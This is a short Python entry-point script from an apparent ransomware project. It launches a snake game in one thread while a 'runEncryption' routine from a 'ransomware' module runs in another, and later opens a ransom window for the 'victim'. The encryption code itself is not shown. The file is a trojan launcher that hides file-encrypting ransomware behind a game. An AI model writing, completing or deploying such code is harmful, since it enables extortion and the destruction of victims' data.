from ransomware.mycrypto import runEncryption,CreateFile,checkfile
from ransomware import victim
from game import snake
import threading

if __name__ == "__main__":
    fileCode = checkfile()
    if(fileCode == 0):
        print("open game and run encrypto")
        threading.Thread(target=runEncryption).start()
        threading.Thread(target=snake.run).start()
    elif(fileCode == 1):
        print("open ransom window")
        victim.run()
    elif(fileCode == 2):
        print("open game")
        snake.run()